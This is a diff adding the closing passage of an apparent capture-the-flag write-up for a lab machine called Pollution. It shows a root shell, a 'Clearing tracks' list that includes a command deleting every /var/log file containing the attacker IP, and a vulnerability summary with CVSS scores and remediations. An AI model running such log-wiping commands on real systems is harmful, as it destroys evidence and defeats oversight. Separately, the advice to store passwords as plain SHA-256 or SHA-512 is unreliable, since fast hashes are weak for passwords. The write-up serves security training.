+          It worked ! Now, we can spawn a shell as 
+          
+            
+              root
+            
+          
+           like so : 
+        </p>
+        
+        
+        
+<pre id="8808a838-ad19-43cd-b878-69b580691b07" class="code"><code>www-data@pollution:/etc/supervisor/conf.d$ bash -p
+bash-5.1# cd /root
+bash-5.1# ls
+pollution_api  root.txt
+bash-5.1# id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+bash-5.1# whoami
+root</code></pre>
+        <h1 id="124c36c7-8def-4eba-9f10-0256e34ef44f">
+          Clearing tracks
+        </h1>
+        <ul id="714d35d1-f288-4302-a429-ebe915bce548">
+          <li>
+            Remove 
+            
+              
+                /tmp/exploit.sh
+              
+            
+          </li>
+        </ul>
+        <ul id="df3bde50-54e3-48fb-947e-d7c74cfdf655">
+          <li>
+            Remove test accounts in 
+            
+              
+                pollution_api
+              
+            
+             database
+          </li>
+        </ul>
+        <ul id="b1c6f667-a827-428a-88f2-dd2f6b362ff5">
+          <li>
+            Remove 
+            
+              
+                Cyberretta
+              
+            
+             account in 
+            
+              
+                forum
+              
+            
+             database
+          </li>
+        </ul>
+        <ul id="dcf09600-968b-4d03-9e44-80661b67ed6e">
+          <li>
+            Remove test accounts in 
+            
+              
+                webapp
+              
+            
+             database
+          </li>
+        </ul>
+        <ul id="adf79a7b-4494-43ad-a8c7-e6fbaa714620">
+          <li>
+            Remove log files that contains trace of our interaction with the system by running 
+            
+              
+                grep -iRl “ATTACKER_IP” | xargs rm -f
+              
+            
+             in 
+            
+              
+                /var/log
+              
+            
+          </li>
+        </ul>
+        <ul id="ff2cac04-2df0-4362-9d8e-2ec496901037">
+          <li>
+            Remove 
+            
+              
+                /var/www/.bash_history
+              
+            
+          </li>
+        </ul>
+        <h1 id="1fc312b1-dc7f-45bd-8b07-78a3a1dc3a08">
+          Vulnerabilities summary
+        </h1>
+        <h2 id="82484c7d-7f4b-4a4b-8f0b-26f3717eb515">
+          
+            Sensitive Information Disclosure
+          
+        </h2>
+        <table id="73ea3de4-b5f8-449f-a0cf-a034a6ff3e02">
+          <thead>
+            <tr id="1eaa8b1d-e2d4-417c-8c6b-29e9177483c6">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="654c9ae8-d080-4490-82d6-f8e3567ba9f3">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Forum
+              </td>
+            </tr>
+            <tr id="08d267f5-bfb5-4e8b-8557-04dad8cf7199">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.2
+                
+              </td>
+            </tr>
+            <tr id="6bac9535-753e-4f06-8999-05de5cfa074a">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="e1ff13ef-1043-45c0-bd9d-7fde3ee92d7c">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="6d07ebc3-4158-46d9-b3b6-f740b803a434">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to get the 
+                
+                  
+                    API token
+                  
+                
+                 to get elevated privileges on the pollution API.
+                
+                
+                This has a 
+                
+                
+                  
+                    low
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , and 
+                
+                
+                  
+                    integrity 
+                  
+                
+                of the affected component. But since the vulnerable component is not the same as the impacted component, the vulnerability is much more severe.
+              </td>
+            </tr>
+            <tr id="60ec868c-2625-46d3-97ff-007459a75fc4">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Remove sensitive informations from forum threads and prevent the team from sharing sensitive information on publicly accessible resources.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="ac73bb1d-4148-4d11-a317-8689c4737657">
+          
+            XXE Injection
+          
+        </h2>
+        <table id="18bca9aa-ea6c-4729-90b5-acd3bdaa4f71">
+          <thead>
+            <tr id="7c7773d2-5b84-48fc-841c-1baaa41f8ca2">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="43e1dc50-1222-468e-ab0a-550f70b0863e">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Pollution API
+              </td>
+            </tr>
+            <tr id="037e68a9-e9ea-44da-81be-d1de6e312ab3">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  5.3
+                
+              </td>
+            </tr>
+            <tr id="20650e42-6758-4437-9ac2-3998c54602b3">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    MEDIUM
+                  
+                
+              </td>
+            </tr>
+            <tr id="6575d776-6dee-4cf4-be5c-ba211b1a059e">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="09d952f4-0b78-4f89-ad8d-efa754b6d223">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to read local files on the system. This vulnerability only affects files readable by 
+                
+                  
+                    www-data
+                  
+                
+                 user.
+                
+                
+                This has a 
+                
+                
+                  
+                    low
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality 
+                  
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="f2ec7b13-834e-4760-a504-f4223a65a52d">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Disable DTDs (External entities) since they are not needed for the API to work properly.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="78ef7f90-ca48-44b2-af63-9151f871df15">
+          
+            Weak password
+          
+        </h2>
+        <table id="9e50f180-dd79-4496-8329-0f9b41fbaf9b">
+          <thead>
+            <tr id="8ee5e8cd-89a9-400c-a2f3-cfd2cda60560">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="eb5212fc-7d5a-42c4-b48d-74703eeef0fb">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                
+                  Developers virtual host
+                
+              </td>
+            </tr>
+            <tr id="e727024e-363a-474a-88ab-9f7f6bc27b71">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  5.3
+                
+              </td>
+            </tr>
+            <tr id="480582c5-cff3-44ef-8dd2-0d832d13dd96">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    MEDIUM
+                  
+                
+              </td>
+            </tr>
+            <tr id="0b18acd0-9515-482b-8852-42cd64fe3f39">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="be7d255c-5533-4dbc-860e-69ff0f43f889">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to authenticate on developers subdomain by brute-forcing the password (if he already has the username) or simply crack the password hash found via another vulnerability.
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                   
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="360b4aeb-81df-4c67-9d15-1c9aa9873c7b">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Change the password for the Basic Authentication on developers subdomain to a stronger one. 
+                
+                
+                Also, set up a strong password policy.
+                
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="96957ef9-3ede-47b3-871c-1bf22e20f695">
+          
+            LFI2RCE
+          
+        </h2>
+        <table id="8fbcff1c-e154-4ce7-a908-275a829389ac">
+          <thead>
+            <tr id="e0b74b5f-446b-463d-8448-a045c029904b">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="535ef3b8-8011-4ad5-84de-4844ac67776c">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                
+                  Developers virtual host
+                
+              </td>
+            </tr>
+            <tr id="ae9a6779-b506-4eb0-8fd4-2d62647f2a9d">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  8.8
+                
+              </td>
+            </tr>
+            <tr id="1dae5da2-9272-4186-8bc5-f07424d092f1">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="b3bc6e06-5cb9-4463-9ce4-1e8fceaffb01">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="93693f30-c77f-4b78-a8d4-a0b256d71720">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to execute commands as 
+                
+                  
+                    www-data
+                  
+                
+                 on the system. The attacker can leverage this to gain a reverse shell for example.
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability
+                  
+                
+                
+                   
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="fdf42985-f70e-4c97-8a97-102313519178">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Add filters to the 
+                
+                  
+                    page
+                  
+                
+                 parameter in 
+                
+                  
+                    /var/www/developers/index.php
+                  
+                
+                 to prevent an attacker from injecting malicious payload in it.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="f8b763c0-61aa-46d5-8bcc-64e4e9e67ecb">
+          
+            PP2RCE
+          
+        </h2>
+        <table id="ebb61166-8ca8-41df-b9ec-380e8293043d">
+          <thead>
+            <tr id="e4eb767f-9a34-4b61-af98-f5bffce72bc7">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="3308c8d2-6164-40ca-a18f-3be7f659655b">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                
+                  Pollution API
+                
+              </td>
+            </tr>
+            <tr id="630e15f0-00db-453e-8451-55bb4843eb2a">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.8
+                
+              </td>
+            </tr>
+            <tr id="f3eda74e-49a6-48f1-9779-cce14f435d0c">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="0179000a-ea4e-42d3-a0e4-757e1f955926">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Local
+                
+              </td>
+            </tr>
+            <tr id="14dd76a0-837f-4f20-97f8-53d32a98eb2d">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to execute arbitrary code as 
+                
+                  
+                    root
+                  
+                
+                 on the system. This can lead to full control over the system.
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability
+                  
+                
+                
+                   
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="4ee0f5bd-2bce-408c-af6e-abd84bcf114e">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Add filters to user input to prevent an attacker from polluting prototypes in the query made to the 
+                
+                  
+                    Pollution API
+                  
+                
+                . For exemple, you can blacklist “
+                
+                  
+                    prototype
+                  
+                
+                ” or “
+                
+                  
+                    constructor
+                  
+                
+                ” words.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="442b3a39-0f76-41d1-8a2b-5673cb9f0636">
+          
+            Clear text passwords
+          
+        </h2>
+        <table id="3b00fcc3-1023-4602-8275-3d1b70cdad10">
+          <thead>
+            <tr id="195b13ea-4b1f-4457-92d9-6b40b419fda9">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="75558021-a9e9-47e4-a0c4-3f384612df09">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                
+                  pollution_api database
+                
+              </td>
+            </tr>
+            <tr id="e3be8bc3-fc49-4df5-89c2-83081d18b448">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  5.5
+                
+              </td>
+            </tr>
+            <tr id="c70998a5-c196-4313-940b-db0eb913173c">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    MEDIUM
+                  
+                
+              </td>
+            </tr>
+            <tr id="44aa1a07-5b57-45e1-a081-648fcfcbceae">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Local
+                
+              </td>
+            </tr>
+            <tr id="0dcb1d27-0888-4a56-acbb-4c9ab38a61df">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                If an attacker gain access to the database or find a way to retrieve passwords from the database, he will be able to access any accounts of the 
+                
+                  
+                    Pollution API
+                  
+                
+                .
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality 
+                  
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="cb2961f1-018e-414e-a5f8-5b48870973b7">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Store hashes instead of clear text passwords. Prefer strong hashing algorithm like 
+                
+                  
+                    SHA-256
+                  
+                
+                 or 
+                
+                  
+                    SHA-512
+                  
+                
+                . Avoid weak hashing algorithm like 
+                
+                  
+                    MD5
+                  
+                
+                .
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="b20c9396-6d33-4d17-bd76-544407fdfd87">
+          Tools used
+        </h1>
+        <table id="1ba8bdf4-a83a-42a7-bfd9-d071bc8e13f4">
+          <thead>
+            <tr id="b4bb1a92-3ec2-40ac-82fc-e8e9d27ec2f2">
+              <th id="`&gt;MF">
+                Tool
+              </th>
+              <th id="A|qY">
+                Purpose
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="ed17eeec-cc1a-4870-90e7-2a94f4956af7">
+              <td id="`&gt;MF">
+                <a href="https://nmap.org/book/man.html">
+                  
+                    Nmap
+                  
+                </a>
+              </td>
+              <td id="A|qY">
+                - Scan for open ports
+                
+                - Scan services versions
+                
+              </td>
+            </tr>
+            <tr id="a00da162-0ffb-47b4-a46b-8e80c6169bfe">
+              <td id="`&gt;MF">
+                <a href="https://github.com/OJ/gobuster">
+                  
+                    Gobuster
+                  
+                </a>
+              </td>
+              <td id="A|qY">
+                - Fuzz virtual hosts
+              </td>
+            </tr>
+            <tr id="87983922-c7c7-474c-802f-9ed153da2645">
+              <td id="`&gt;MF">
+                <a href="https://portswigger.net/burp">
+                  BurpSuite
+                </a>
+              </td>
+              <td id="A|qY">
+                - Analyse and modify requests sent to the web server
+              </td>
+            </tr>
+            <tr id="960373f4-8c63-4e7b-af95-c3f026cf95f5">
+              <td id="`&gt;MF">
+                <a href="https://github.com/DominicBreuker/pspy">
+                  
+                    Pspy
+                  
+                </a>
+              </td>
+              <td id="A|qY">
+                - Enumerate running process
+              </td>
+            </tr>
+            <tr id="fff1f8ef-472c-4b6b-a08d-b2df1706e4f9">
+              <td id="`&gt;MF">
+                
+                  <a href="https://www.openwall.com/john/">
+                    John
+                  </a>
+                
+              </td>
+              <td id="A|qY">
+                - Crack password hashes
+              </td>
+            </tr>
+            <tr id="7f85e0c0-d979-4546-9e29-bc7a1cd1eeff">
+              <td id="`&gt;MF">
+                
+                  <a href="https://github.com/synacktiv/php_filter_chain_generator">
+                    PHP filter chain generator
+                  </a>
+                
+              </td>
+              <td id="A|qY">
+                - Generate the payload to exploit the LFI2RCE
+              </td>
+            </tr>
+            <tr id="2e902866-796d-4f3b-a9dc-84e6d2892e0e">
+              <td id="`&gt;MF">
+                
+                  <a href="https://linux.die.net/man/1/base64">
+                    Base64
+                  </a>
+                
+              </td>
+              <td id="A|qY">
+                - Decode data in victor’s proxy history
+              </td>
+            </tr>
+            <tr id="f9341773-baf9-4c5d-8b44-51fc0a887b4d">
+              <td id="`&gt;MF">
+                
+                  <a href="https://linux.die.net/man/1/curl">
+                    curl
+                  </a>
+                
+              </td>
+              <td id="A|qY">
+                - Send requests to the Pollution API
+              </td>
+            </tr>
+            <tr id="648655fa-6c94-4f59-a305-2af7f717fb6d">
+              <td id="`&gt;MF">
+                <a href="http://python.org/downloads/">
+                  
+                    Python3
+                  
+                </a>
+              </td>
+              <td id="A|qY">
+                - Run a simple HTTP server
+              </td>
+            </tr>
+            <tr id="d9d888ae-3bc5-4f10-9f76-1fda51a6ab87">
+              <td id="`&gt;MF">
+                
+                  <a href="https://www.mysql.com/">
+                    MySQL
+                  </a>
+                
+              </td>
+              <td id="A|qY">
+                - Enumerate databases
+              </td>
+            </tr>
+            <tr id="1019e20f-f085-422e-974c-86e0d06910db">
+              <td id="`&gt;MF">
+                <a href="https://redis.io/docs/ui/cli/">
+                  
+                    redis-cli
+                  
+                </a>
+              </td>
+              <td id="A|qY">
+                - Connect to the Redis database
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="c781f86f-f8d3-4a33-a70d-f845f003e2a8">
+          Sources
+        </h1>
+        <ul id="c13bee22-736b-4f43-9691-49a95e8164e8">
+          <li>
+            NodeJS PP2RCE (Prototype Pollution to Remote Code Execution) : 
+            <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce">
+              https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce
+            </a>
+          </li>
+        </ul>
+        <ul id="adfc5dac-6df5-4ab9-8c2f-2748c3d613be">
+          <li>
+            PHP LFI2RCE (Local File Inclusion to Remote Code Execution) via PHP Filters : 
+            <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters">
+              https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
+            </a>
+          </li>
+        </ul>
+        <ul id="66ceeea6-dc76-4dec-b38e-f1d90948337d">
+          <li>
+            XXE (XML External Entity) injection : 
+            <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">
+              https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+            </a>
+          </li>
+        </ul>
+      </div>
+    
+    <span>
+    </span>
+  
+
